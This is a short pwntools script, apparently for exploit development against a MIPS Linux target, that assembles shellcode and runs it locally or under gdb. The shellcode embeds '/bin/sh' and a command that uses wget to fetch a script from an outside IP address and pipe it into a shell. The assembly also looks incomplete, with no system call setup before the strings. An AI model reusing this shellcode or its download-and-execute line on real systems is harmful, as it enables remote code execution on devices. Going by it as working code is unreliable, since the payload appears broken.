from pwn import *
context.update(arch='mips', os='linux', bits=32, endian='little')
ip = "101.102.103.104:5555"
shellcode = asm(f'''
    bltzal  $zero, getpc
getpc:
    slti    $a2, $zero, -1
.string "/bin/sh"
.string "wget http://101.102.103.104:4444 -qO-|ash"
''')

print(shellcode)
print(len(shellcode))

tmp = ''.join([ '\\x%02x' % x for x in shellcode ])

for i in range(len(tmp)):
    print(tmp[i], end='')
    if i % 16 == 15:
        print()


### RUN SHELLCODE ###
filename = make_elf(shellcode, extract=False)

gs = """
break *(vuln+169)
continue
"""
if args.GDB:
    context.terminal = ["tmux", "splitw", "-h"]
    p = gdb.debug(filename, gdbscript=gs)
else:
    p = process(filename)
p.interactive()